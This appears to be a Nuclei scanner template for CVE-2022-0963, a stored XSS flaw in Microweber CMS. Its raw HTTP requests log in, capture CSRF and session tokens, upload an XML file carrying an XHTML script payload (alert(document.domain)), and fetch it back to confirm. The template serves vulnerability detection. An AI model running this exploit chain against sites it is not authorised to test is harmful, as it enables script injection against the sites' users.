id: CVE-2022-0963

info:
  name: Unrestricted XML Files Leads to Stored XSS in Microweber
  author: amit-jd
  severity: Medium 
  description:  Microweber prior to 1.2.12 allows unrestricted upload of XML files, which malicious actors can exploit to cause a stored cross-site scripting attack.
  reference:
    - https://huntr.dev/bounties/a89a4198-0880-4aa2-8439-a463f39f244c/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0963
    - https://github.com/advisories/GHSA-q3x2-jvp3-wj78
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.7
    cwe-id: CWE-79
  tags: xss, microweber, CMS, upload

requests:
  - raw:
      - |-
        POST /api/user_login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

      - |
        POST /csrf/ HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest

      - |
        POST /plupload HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        X-XSRF-TOKEN: {{url_decode(csrf_token)}}
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=---------------------------59866212126262636974202255034
        Referer: http://{{Hostname}}/admin/view:modules/load_module:files
        Cookie: laravel_session={{session}}; XSRF-TOKEN={{csrf_token}}

        -----------------------------59866212126262636974202255034
        Content-Disposition: form-data; name="name"

        pocxss.xml
        -----------------------------59866212126262636974202255034
        Content-Disposition: form-data; name="chunk"

        0
        -----------------------------59866212126262636974202255034
        Content-Disposition: form-data; name="chunks"

        1
        -----------------------------59866212126262636974202255034
        Content-Disposition: form-data; name="file"; filename="blob"
        Content-Type: application/octet-stream

        <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
        -----------------------------59866212126262636974202255034--

      - |
        GET /userfiles/media/default/pocxss.xml HTTP/1.1
        Host: {{Hostname}}
        
    req-condition: true
    cookie-reuse: true
    extractors:
      - type: kval
        part: header
        name: csrf_token
        kval:
          - XSRF-TOKEN
        internal: true

      - type: kval
        part: header
        name: session
        kval:
          - laravel_session
        internal: true
        
    matchers:   
      - type: dsl
        dsl:
          - 'contains(body_4,"alert(document.domain)")'
          - 'status_code_4==200'
          - 'contains(body_3,"bytes_uploaded")'
        condition: and